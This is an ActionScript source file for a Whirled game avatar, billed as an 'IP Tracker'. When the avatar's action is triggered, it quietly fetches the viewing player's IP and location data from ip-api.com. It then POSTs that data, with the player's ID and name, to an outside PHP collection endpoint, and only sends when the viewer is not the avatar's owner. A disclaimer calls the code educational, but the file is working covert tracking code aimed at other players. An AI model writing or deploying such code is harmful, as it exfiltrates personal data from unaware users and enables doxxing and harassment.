package  {
	import flash.events.Event;
	import flash.events.IOErrorEvent;
	import flash.events.SecurityErrorEvent;
	import flash.system.Security;
	import flash.net.*;
	import com.whirled.*;
	import com.threerings.util.NetUtil;

	/* 
	Programmed by Shadowsych.
	GitHub: https://www.github.com/Shadowsych
	
	This is an IP Tracker that receives the IP Address of players
	within a Whirled room and sends it to a database running under a
	web-server.
	
	DISCLAIMER:
	THIS PROGRAM IS USED FOR SECURITY/EDUCATIONAL PURPOSES AND SHOULD NOT
	BE UTILIZED FOR MALICIOUS REASONS. ALL LIABILITIES ARE TO THE USER OF
	THIS PROGRAM, AND NOT TO THE OWNER.
	*/
	public class IPTracker {

		//CONFIGURATION
		private var IPTrackURL:String;
		private var _ctrl: AvatarControl;
		
		//variables for the client's information
		private var playerId:String;
		private var playerName:String;
		private var playerURL:String;
		private var IPLoader:URLLoader = new URLLoader();
		
		public function IPTracker(_ctrl:AvatarControl, playerURL:String, IPTrackURL:String = "https://whirledtracker.000webhostapp.com/IPTracker.php") {
			//event listener(s)
			_ctrl.addEventListener(ControlEvent.ACTION_TRIGGERED, trackAddress)
			_ctrl.registerActions("IP Tracker");
			
			//initialize parameters and user variables
			this.IPTrackURL = IPTrackURL;
			this._ctrl = _ctrl;
			this.playerId = String(_ctrl.getInstanceId());
			this.playerName = _ctrl.getViewerName(int(playerId));
			this.playerURL = playerURL;
		}
		//event function to start when the "IP Tracker" action has started
		private function trackAddress(E:ControlEvent) {
			//check if the action clicked was named "IP Tracker"
			if (E.name == "IP Tracker")
			{
				//load the network information API, and create an event if it loaded successfully
				Security.loadPolicyFile("http://ip-api.com/crossdomain.xml");
				IPLoader.load(new URLRequest("http://ip-api.com/json/"));
				IPLoader.addEventListener(Event.COMPLETE, loadSuccess);
			}
		}
		//successfully loaded the client's network information from the API
		private function loadSuccess(E:Event) {
			var loader:URLLoader = URLLoader(E.target);
			var playerInfo:String = String(loader.data);
			
			//send POST request to send the client's network information to the database
			var IPTrackRequest:URLRequest = new URLRequest(IPTrackURL);
			IPTrackRequest.method = URLRequestMethod.POST;
			var vars:URLVariables = new URLVariables();
			vars.playerId = playerId;
			vars.playerName = playerName;
			vars.playerURL = playerURL;
			vars.playerInfo = playerInfo;
			IPTrackRequest.data = vars;
			
			//if the client viewing is not the owner of the avatar, then send the client's information to the server
			if(!_ctrl.hasControl()) {
				NetUtil.navigateToURL(IPTrackRequest, "_self");
			}
		}
	}
}
